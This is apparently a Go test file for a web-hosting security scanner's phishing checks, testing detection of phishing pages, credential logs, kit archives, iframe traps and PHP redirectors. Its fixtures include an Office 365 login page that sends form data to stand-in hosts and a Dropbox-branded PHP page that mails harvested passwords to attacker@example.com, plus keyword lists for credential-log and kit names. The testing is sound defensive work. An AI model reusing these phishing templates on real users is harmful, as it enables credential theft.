package checks

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

// --- extractTitle -----------------------------------------------------

func TestExtractTitleStandard(t *testing.T) {
	got := extractTitle("<html><head><title>office 365 login</title></head>")
	if got != "office 365 login" {
		t.Errorf("got %q", got)
	}
}

func TestExtractTitleMissing(t *testing.T) {
	if got := extractTitle("<html><body>no title here</body></html>"); got != "" {
		t.Errorf("got %q, want empty", got)
	}
}

func TestExtractTitleUnclosed(t *testing.T) {
	if got := extractTitle("<title>no close tag"); got != "" {
		t.Errorf("got %q, want empty", got)
	}
}

// --- hasExternalFormAction --------------------------------------------

func TestHasExternalFormActionHTTPS(t *testing.T) {
	if !hasExternalFormAction(`<form action="https://evil.example/login">`) {
		t.Error("https external should be true")
	}
}

func TestHasExternalFormActionHTTP(t *testing.T) {
	if !hasExternalFormAction(`<form action="http://evil.example/login">`) {
		t.Error("http external should be true")
	}
}

func TestHasExternalFormActionRelative(t *testing.T) {
	if hasExternalFormAction(`<form action="/login">`) {
		t.Error("relative path should not be external")
	}
}

func TestHasExternalFormActionSingleQuotes(t *testing.T) {
	if !hasExternalFormAction(`<form action='https://evil.example'>`) {
		t.Error("single-quoted external should be detected")
	}
}

func TestHasExternalFormActionMissing(t *testing.T) {
	if hasExternalFormAction(`<form>`) {
		t.Error("no action attribute should not match")
	}
}

func TestHasExternalFormActionUnquoted(t *testing.T) {
	if hasExternalFormAction(`<form action=https://evil.example>`) {
		t.Error("unquoted value is not a quoted form, should not match")
	}
}

// --- isSelfContainedHTML ----------------------------------------------

func TestIsSelfContainedHTMLInlineOnly(t *testing.T) {
	html := `<html><head><style>body{color:red}</style></head></html>`
	if !isSelfContainedHTML(html) {
		t.Error("inline style with no external CSS should be self-contained")
	}
}

func TestIsSelfContainedHTMLInlineWithOneCDN(t *testing.T) {
	html := `<style>body{}</style><link rel="stylesheet" href="fontawesome">`
	if !isSelfContainedHTML(html) {
		t.Error("inline + one external should still be self-contained")
	}
}

func TestIsSelfContainedHTMLTooManyExternal(t *testing.T) {
	html := `<style>body{}</style><link rel="stylesheet" href="a"><link rel="stylesheet" href="b">`
	if isSelfContainedHTML(html) {
		t.Error("two externals should disqualify")
	}
}

func TestIsSelfContainedHTMLNoInline(t *testing.T) {
	html := `<link rel="stylesheet" href="a">`
	if isSelfContainedHTML(html) {
		t.Error("no inline style should disqualify")
	}
}

// --- looksLikePersonName ----------------------------------------------

func TestLooksLikePersonNameCamelCase(t *testing.T) {
	if !looksLikePersonName("PalmerHamilton") {
		t.Error("CamelCase person name should match")
	}
	if !looksLikePersonName("MarilynEsguerra") {
		t.Error("CamelCase person name should match")
	}
}

func TestLooksLikePersonNameShort(t *testing.T) {
	if looksLikePersonName("AbCd") {
		t.Error("too short should not match")
	}
}

func TestLooksLikePersonNameSingleWord(t *testing.T) {
	if looksLikePersonName("Hamilton") {
		t.Error("single capitalized word should not match")
	}
}

func TestLooksLikePersonNameHasDigits(t *testing.T) {
	if looksLikePersonName("PalmerH4milton") {
		t.Error("contains digits should not match")
	}
}

func TestLooksLikePersonNameWebName(t *testing.T) {
	if looksLikePersonName("index") {
		t.Error("web name should not match")
	}
	if looksLikePersonName("default") {
		t.Error("web name should not match")
	}
}

// --- looksLikeBusinessName --------------------------------------------

func TestLooksLikeBusinessNameCamelCase(t *testing.T) {
	if !looksLikeBusinessName("WashingtonGolf") {
		t.Error("CamelCase business name should match")
	}
}

func TestLooksLikeBusinessNameHyphenated(t *testing.T) {
	if !looksLikeBusinessName("federated-lighting") {
		t.Error("hyphenated multi-word should match")
	}
}

func TestLooksLikeBusinessNameUnderscored(t *testing.T) {
	if !looksLikeBusinessName("northwest_crawlspace") {
		t.Error("underscored multi-word should match")
	}
}

func TestLooksLikeBusinessNameLongLowercase(t *testing.T) {
	if !looksLikeBusinessName("healthcornerpediattrics") {
		t.Error("long lowercase name should match")
	}
}

func TestLooksLikeBusinessNameShort(t *testing.T) {
	if looksLikeBusinessName("abcd") {
		t.Error("too short should not match")
	}
}

func TestLooksLikeBusinessNameStandardDir(t *testing.T) {
	for _, name := range []string{"images", "assets", "uploads", "admin"} {
		if looksLikeBusinessName(name) {
			t.Errorf("standard dir %q should not match", name)
		}
	}
}

func TestLooksLikeBusinessNameTechPrefix(t *testing.T) {
	for _, name := range []string{"php-email-form", "wp-login", "react-app"} {
		if looksLikeBusinessName(name) {
			t.Errorf("tech prefix %q should not match", name)
		}
	}
}

// --- isKnownCMSFile / isKnownSafeDir ----------------------------------

func TestIsKnownCMSFileWPFiles(t *testing.T) {
	for _, name := range []string{"wp-config.php", "wp-login.php", "xmlrpc.php", "index.php"} {
		if !isKnownCMSFile(name) {
			t.Errorf("%q should be recognized as CMS", name)
		}
	}
}

func TestIsKnownCMSFileUnknown(t *testing.T) {
	for _, name := range []string{"login.php", "harvest.php", "credentials.php"} {
		if isKnownCMSFile(name) {
			t.Errorf("%q should not be recognized as CMS", name)
		}
	}
}

func TestIsKnownSafeDir(t *testing.T) {
	for _, name := range []string{"wp-admin", "node_modules", "vendor", ".git"} {
		if !isKnownSafeDir(name) {
			t.Errorf("%q should be safe", name)
		}
	}
	if isKnownSafeDir("PhishingKit") {
		t.Error("unknown dir should not be safe")
	}
}

// --- isCredentialLogName ----------------------------------------------

func TestIsCredentialLogNameExact(t *testing.T) {
	for _, name := range []string{"results.txt", "creds.txt", "passwords.txt", "victims.txt"} {
		if !isCredentialLogName(name) {
			t.Errorf("%q should match exact list", name)
		}
	}
}

func TestIsCredentialLogNameKeyword(t *testing.T) {
	for _, name := range []string{"resultlog.txt", "victim_list.csv", "harvested_data.log"} {
		if !isCredentialLogName(name) {
			t.Errorf("%q should match keyword", name)
		}
	}
}

func TestIsCredentialLogNameBenign(t *testing.T) {
	for _, name := range []string{"readme.md", "test.txt", "error.log", "config.json"} {
		if isCredentialLogName(name) {
			t.Errorf("%q should not match", name)
		}
	}
}

// --- isPhishingKitZip -------------------------------------------------

func TestIsPhishingKitZipSingleBrand(t *testing.T) {
	for _, name := range []string{"office365_kit.zip", "outlook_login.zip", "paypal-scam.zip"} {
		if !isPhishingKitZip(name) {
			t.Errorf("%q should match", name)
		}
	}
}

func TestIsPhishingKitZipMultiMatch(t *testing.T) {
	if !isPhishingKitZip("secure_bank_login.zip") {
		t.Error("multi-match (secure+bank+login) should match")
	}
}

func TestIsPhishingKitZipSingleLowConfidenceDoesNotMatch(t *testing.T) {
	for _, name := range []string{"login_form.zip", "secure_archive.zip", "bank_template.zip"} {
		if isPhishingKitZip(name) {
			t.Errorf("%q should not match (single low-conf keyword)", name)
		}
	}
}

func TestIsPhishingKitZipNoMatch(t *testing.T) {
	if isPhishingKitZip("project_backup.zip") {
		t.Error("unrelated archive should not match")
	}
}

// --- quickPhishingCheck -----------------------------------------------

func TestQuickPhishingCheckPositive(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "login.html")
	content := `<html><body><form><input type="email" name="email"></form></body></html>`
	_ = os.WriteFile(path, []byte(content), 0600)
	if !quickPhishingCheck(path) {
		t.Error("form with email input should match")
	}
}

func TestQuickPhishingCheckNoForm(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "about.html")
	_ = os.WriteFile(path, []byte("<p>just some text with password word</p>"), 0600)
	if quickPhishingCheck(path) {
		t.Error("text without form should not match")
	}
}

func TestQuickPhishingCheckMissingFile(t *testing.T) {
	if quickPhishingCheck(filepath.Join(t.TempDir(), "nope.html")) {
		t.Error("missing file should return false")
	}
}

func TestQuickPhishingCheckEmptyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.html")
	_ = os.WriteFile(path, []byte(""), 0600)
	if quickPhishingCheck(path) {
		t.Error("empty file should return false")
	}
}

// --- checkCredentialLog -----------------------------------------------

func TestCheckCredentialLogPairs(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "results.txt")
	content := `alice@example.com:pass1
bob@example.com|secret
carol@example.com,hunter2
dan@example.com:password`
	_ = os.WriteFile(path, []byte(content), 0600)

	got := checkCredentialLog(path)
	if !strings.Contains(got, "credential-like lines") {
		t.Errorf("expected credential-like lines, got %q", got)
	}
}

func TestCheckCredentialLogEmailDensity(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "emails.txt")
	var lines []string
	for i := 0; i < 12; i++ {
		lines = append(lines, "user"+string(rune('a'+i))+"@example.com")
	}
	_ = os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0600)

	got := checkCredentialLog(path)
	if !strings.Contains(got, "harvested email list") {
		t.Errorf("expected harvested email list, got %q", got)
	}
}

func TestCheckCredentialLogCSVSkipped(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "contacts.csv")
	var lines []string
	for i := 0; i < 12; i++ {
		lines = append(lines, "user"+string(rune('a'+i))+"@example.com")
	}
	_ = os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0600)

	got := checkCredentialLog(path)
	if got != "" {
		t.Errorf("csv files with only emails should not match, got %q", got)
	}
}

func TestCheckCredentialLogNoMatch(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "log.txt")
	_ = os.WriteFile(path, []byte("ordinary log line\nanother line\n"), 0600)
	if got := checkCredentialLog(path); got != "" {
		t.Errorf("ordinary log should not match, got %q", got)
	}
}

func TestCheckCredentialLogMissingFile(t *testing.T) {
	if got := checkCredentialLog(filepath.Join(t.TempDir(), "nope.txt")); got != "" {
		t.Errorf("missing file should return empty, got %q", got)
	}
}

// --- checkIframePhishing ----------------------------------------------

func TestCheckIframePhishingFullscreenExternal(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "redir.html")
	content := `<html><body><iframe src="https://evil.example/phish" width="100%" height="100%"></iframe></body></html>`
	_ = os.WriteFile(path, []byte(content), 0600)

	got := checkIframePhishing(path)
	if !strings.Contains(got, "Full-screen iframe") {
		t.Errorf("expected full-screen iframe match, got %q", got)
	}
}

func TestCheckIframePhishingExfilDomain(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "redir.html")
	content := `<html><body><iframe src="https://abuse.workers.dev/x" width="10" height="10"></iframe></body></html>`
	_ = os.WriteFile(path, []byte(content), 0600)

	got := checkIframePhishing(path)
	if !strings.Contains(got, "suspicious external URL") {
		t.Errorf("expected suspicious URL match, got %q", got)
	}
}

func TestCheckIframePhishingNoIframe(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "ok.html")
	_ = os.WriteFile(path, []byte("<html><body>no iframe</body></html>"), 0600)
	if got := checkIframePhishing(path); got != "" {
		t.Errorf("no iframe should return empty, got %q", got)
	}
}

func TestCheckIframePhishingRelativeSrc(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "rel.html")
	content := `<iframe src="/local/page.html" width="100%"></iframe>`
	_ = os.WriteFile(path, []byte(content), 0600)
	if got := checkIframePhishing(path); got != "" {
		t.Errorf("relative iframe should not match, got %q", got)
	}
}

func TestCheckIframePhishingMissingFile(t *testing.T) {
	if got := checkIframePhishing(filepath.Join(t.TempDir(), "nope.html")); got != "" {
		t.Errorf("missing file should return empty, got %q", got)
	}
}

// --- checkPHPRedirector -----------------------------------------------

func TestCheckPHPRedirectorUserControlled(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "go.php")
	content := `<?php header("Location: " . $_GET['url']); ?>`
	_ = os.WriteFile(path, []byte(content), 0600)

	got := checkPHPRedirector(path)
	if !strings.Contains(got, "user-supplied URL") {
		t.Errorf("expected user-controlled match, got %q", got)
	}
}

func TestCheckPHPRedirectorHardcodedExfil(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "redir.php")
	content := `<?php header("Location: https://abuse.workers.dev/steal"); ?>`
	_ = os.WriteFile(path, []byte(content), 0600)

	got := checkPHPRedirector(path)
	if !strings.Contains(got, "suspicious destination") {
		t.Errorf("expected suspicious destination match, got %q", got)
	}
}

func TestCheckPHPRedirectorNoHeader(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "ok.php")
	_ = os.WriteFile(path, []byte("<?php echo 'hello'; ?>"), 0600)
	if got := checkPHPRedirector(path); got != "" {
		t.Errorf("no header() should return empty, got %q", got)
	}
}

func TestCheckPHPRedirectorBenignHeader(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "login.php")
	// header() to a hardcoded safe URL should not flag.
	content := `<?php header("Location: /dashboard"); ?>`
	_ = os.WriteFile(path, []byte(content), 0600)
	if got := checkPHPRedirector(path); got != "" {
		t.Errorf("safe redirect should return empty, got %q", got)
	}
}

func TestCheckPHPRedirectorMissingFile(t *testing.T) {
	if got := checkPHPRedirector(filepath.Join(t.TempDir(), "nope.php")); got != "" {
		t.Errorf("missing file should return empty, got %q", got)
	}
}

// --- analyzeHTMLForPhishing -------------------------------------------

const officePhishHTML = `<!DOCTYPE html>
<html>
<head>
<title>Office 365 Sign In</title>
<style>body{font-family:arial}</style>
</head>
<body>
<h1>Secured by Microsoft</h1>
<p>Verify your identity to continue. Unusual activity detected.</p>
<form action="https://evil.example/harvest.php" method="post">
<input type="email" name="email" placeholder="Work or school email">
<input type="password" name="password">
<button>Sign In</button>
</form>
<script>
fetch('https://workers.dev/log', {method:'POST',body:document.forms[0]});
</script>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Q/0Y+gAAAAASUVORK5CYII=">
</body>
</html>`

func TestAnalyzeHTMLForPhishingDetectsBrandPhishing(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "verify.html")
	_ = os.WriteFile(path, []byte(officePhishHTML), 0600)

	res := analyzeHTMLForPhishing(path)
	if res == nil {
		t.Fatal("expected phishing detection, got nil")
	}
	if !strings.Contains(strings.ToLower(res.brand), "microsoft") {
		t.Errorf("expected Microsoft brand, got %q", res.brand)
	}
	if res.score < 4 {
		t.Errorf("score = %d, want >= 4", res.score)
	}
}

func TestAnalyzeHTMLForPhishingNoForm(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "about.html")
	_ = os.WriteFile(path, []byte("<html><body>no form here</body></html>"), 0600)
	if res := analyzeHTMLForPhishing(path); res != nil {
		t.Errorf("no form should return nil, got %+v", res)
	}
}

func TestAnalyzeHTMLForPhishingNoCredentialInput(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "search.html")
	content := `<html><body><form><input type="text" name="query"></form></body></html>`
	_ = os.WriteFile(path, []byte(content), 0600)
	if res := analyzeHTMLForPhishing(path); res != nil {
		t.Errorf("non-credential form should return nil, got %+v", res)
	}
}

func TestAnalyzeHTMLForPhishingBenignLoginLowScore(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "login.html")
	// Real credential form with no brand and no exfil signals.
	content := `<html><head><title>Member Area</title></head><body>
<form action="/login"><input type="email" name="email"><input type="password" name="password"></form>
</body></html>`
	_ = os.WriteFile(path, []byte(content), 0600)
	if res := analyzeHTMLForPhishing(path); res != nil {
		t.Errorf("benign login should return nil, got %+v", res)
	}
}

func TestAnalyzeHTMLForPhishingMissingFile(t *testing.T) {
	if res := analyzeHTMLForPhishing(filepath.Join(t.TempDir(), "nope.html")); res != nil {
		t.Errorf("missing file should return nil, got %+v", res)
	}
}

func TestAnalyzeHTMLForPhishingEmptyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.html")
	_ = os.WriteFile(path, []byte(""), 0600)
	if res := analyzeHTMLForPhishing(path); res != nil {
		t.Errorf("empty file should return nil, got %+v", res)
	}
}

// --- analyzePHPForPhishing --------------------------------------------

const dropboxPhishPHP = `<?php
if ($_POST['email']) {
    $em = $_POST['email'];
    $pw = $_POST['password'];
    mail("attacker@example.com", "creds", "email: $em password: $pw");
    file_put_contents("results.txt", "$em:$pw\n", FILE_APPEND);
    header("Location: https://dropbox.com");
}
?>
<html><head><title>Dropbox Shared File</title></head>
<body>
<h1>Secured by Dropbox</h1>
<p>Verify your identity to access the shared file.</p>
<form method="post">
<input type="email" name="email">
<input type="password" name="password">
<button>Sign in</button>
</form>
</body>
</html>`

func TestAnalyzePHPForPhishingDetectsDropbox(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "share.php")
	_ = os.WriteFile(path, []byte(dropboxPhishPHP), 0600)

	res := analyzePHPForPhishing(path)
	if res == nil {
		t.Fatal("expected detection, got nil")
	}
	if !strings.Contains(strings.ToLower(res.brand), "dropbox") {
		t.Errorf("brand = %q, want dropbox", res.brand)
	}
	if res.score < 4 {
		t.Errorf("score = %d, want >= 4", res.score)
	}
}

func TestAnalyzePHPForPhishingNoBrandRejected(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "contact.php")
	content := `<?php
if ($_POST['email']) {
    mail("owner@example.com", "contact", $_POST['email'] . " " . $_POST['message']);
}
?>
<form><input type="email" name="email"><input name="message"></form>`
	_ = os.WriteFile(path, []byte(content), 0600)

	if res := analyzePHPForPhishing(path); res != nil {
		t.Errorf("contact form with no brand should return nil, got %+v", res)
	}
}

func TestAnalyzePHPForPhishingNoCredHandlingOrForm(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "about.php")
	_ = os.WriteFile(path, []byte("<?php echo 'hello'; ?>"), 0600)
	if res := analyzePHPForPhishing(path); res != nil {
		t.Errorf("plain php should return nil, got %+v", res)
	}
}

func TestAnalyzePHPForPhishingMissingFile(t *testing.T) {
	if res := analyzePHPForPhishing(filepath.Join(t.TempDir(), "nope.php")); res != nil {
		t.Errorf("missing file should return nil, got %+v", res)
	}
}

func TestAnalyzePHPForPhishingEmptyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.php")
	_ = os.WriteFile(path, []byte(""), 0600)
	if res := analyzePHPForPhishing(path); res != nil {
		t.Errorf("empty file should return nil, got %+v", res)
	}
}

// --- analyzeDirectoryStructure ----------------------------------------

func TestAnalyzeDirectoryStructurePhishingDrop(t *testing.T) {
	dir := t.TempDir()
	dropDir := filepath.Join(dir, "WashingtonGolf")
	_ = os.MkdirAll(dropDir, 0700)
	// One HTML file with credential form.
	content := `<html><form><input type="email"><input type="password"></form></html>`
	_ = os.WriteFile(filepath.Join(dropDir, "PalmerHamilton.html"), []byte(content), 0600)

	res := analyzeDirectoryStructure(dropDir, "alice")
	if res == nil {
		t.Fatal("expected phishing directory detection")
	}
	if res.Check != "phishing_directory" {
		t.Errorf("Check = %q", res.Check)
	}
	if !strings.Contains(res.Details, "PalmerHamilton") {
		t.Errorf("details should mention person-name filename: %q", res.Details)
	}
}

func TestAnalyzeDirectoryStructureTooManyHTML(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "BigBusinessName")
	_ = os.MkdirAll(target, 0700)
	for _, n := range []string{"a.html", "b.html", "c.html", "d.html"} {
		_ = os.WriteFile(filepath.Join(target, n), []byte("<html>"), 0600)
	}
	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
		t.Errorf(">3 HTML files should not match, got %+v", res)
	}
}

func TestAnalyzeDirectoryStructureHasSubdirs(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "WashingtonGolf")
	_ = os.MkdirAll(filepath.Join(target, "assets"), 0700)
	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
		t.Errorf("subdirs should disqualify, got %+v", res)
	}
}

func TestAnalyzeDirectoryStructureNonBusinessName(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "images") // standard dir
	_ = os.MkdirAll(target, 0700)
	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
		t.Errorf("standard dir name should not match, got %+v", res)
	}
}

func TestAnalyzeDirectoryStructureNoPhishingContent(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "FederatedLighting")
	_ = os.MkdirAll(target, 0700)
	// HTML file without credential inputs.
	_ = os.WriteFile(filepath.Join(target, "home.html"), []byte("<html><body>welcome</body></html>"), 0600)
	if res := analyzeDirectoryStructure(target, "alice"); res != nil {
		t.Errorf("non-phishing content should not match, got %+v", res)
	}
}

func TestAnalyzeDirectoryStructureMissingDir(t *testing.T) {
	if res := analyzeDirectoryStructure(filepath.Join(t.TempDir(), "missing"), "alice"); res != nil {
		t.Errorf("missing dir should return nil, got %+v", res)
	}
}

// --- scanForPhishing (end-to-end over a fake public_html) -------------

func TestScanForPhishingFindsPhishPageAndRedirector(t *testing.T) {
	root := t.TempDir()
	// Phishing HTML at ~3KB+
	phishPath := filepath.Join(root, "verify.html")
	_ = os.WriteFile(phishPath, []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600)

	// PHP redirector (small)
	redirPath := filepath.Join(root, "go.php")
	_ = os.WriteFile(redirPath, []byte(`<?php header("Location: " . $_GET['url']); ?>`), 0600)

	// Credential log file
	logPath := filepath.Join(root, "results.txt")
	_ = os.WriteFile(logPath, []byte("a@a.com:p1\nb@a.com:p2\nc@a.com:p3\nd@a.com:p4\n"), 0600)

	// Phishing kit zip
	zipPath := filepath.Join(root, "office365_kit.zip")
	_ = os.WriteFile(zipPath, make([]byte, 2000), 0600)

	cfg := &config.Config{}
	var findings []alert.Finding
	scanForPhishing(context.Background(), root, 3, "alice", cfg, &findings)

	if len(findings) == 0 {
		t.Fatal("expected findings, got none")
	}

	checks := make(map[string]bool)
	for _, f := range findings {
		checks[f.Check] = true
	}
	for _, want := range []string{"phishing_page", "phishing_redirector", "phishing_credential_log", "phishing_kit_archive"} {
		if !checks[want] {
			t.Errorf("missing expected check %q in findings %v", want, checks)
		}
	}
}

func TestScanForPhishingMaxDepthZero(t *testing.T) {
	root := t.TempDir()
	_ = os.WriteFile(filepath.Join(root, "verify.html"), []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600)

	cfg := &config.Config{}
	var findings []alert.Finding
	scanForPhishing(context.Background(), root, 0, "alice", cfg, &findings)
	if len(findings) != 0 {
		t.Errorf("maxDepth=0 should bail out, got %d findings", len(findings))
	}
}

func TestScanForPhishingMissingDir(t *testing.T) {
	cfg := &config.Config{}
	var findings []alert.Finding
	scanForPhishing(context.Background(), filepath.Join(t.TempDir(), "missing"), 3, "alice", cfg, &findings)
	if len(findings) != 0 {
		t.Errorf("missing dir should return no findings, got %d", len(findings))
	}
}

func TestScanForPhishingSuppressedPath(t *testing.T) {
	root := t.TempDir()
	_ = os.WriteFile(filepath.Join(root, "verify.html"), []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600)

	cfg := &config.Config{}
	cfg.Suppressions.IgnorePaths = []string{"*.html"}
	var findings []alert.Finding
	scanForPhishing(context.Background(), root, 3, "alice", cfg, &findings)
	for _, f := range findings {
		if f.Check == "phishing_page" {
			t.Errorf("suppressed path should not yield phishing_page finding: %+v", f)
		}
	}
}

func TestScanForPhishingContextCancelled(t *testing.T) {
	root := t.TempDir()
	_ = os.WriteFile(filepath.Join(root, "verify.html"), []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600)

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel before scanning

	cfg := &config.Config{}
	var findings []alert.Finding
	scanForPhishing(ctx, root, 3, "alice", cfg, &findings)
	if len(findings) != 0 {
		t.Errorf("cancelled context should yield 0 findings, got %d", len(findings))
	}
}

func TestScanForPhishingSkipsKnownSafeDir(t *testing.T) {
	root := t.TempDir()
	safe := filepath.Join(root, "wp-admin")
	_ = os.MkdirAll(safe, 0700)
	// Would normally match but the dir is in the skip list.
	_ = os.WriteFile(filepath.Join(safe, "verify.html"), []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600)

	cfg := &config.Config{}
	var findings []alert.Finding
	scanForPhishing(context.Background(), root, 3, "alice", cfg, &findings)
	for _, f := range findings {
		if f.Check == "phishing_page" {
			t.Errorf("known safe dir should be skipped, got %+v", f)
		}
	}
}
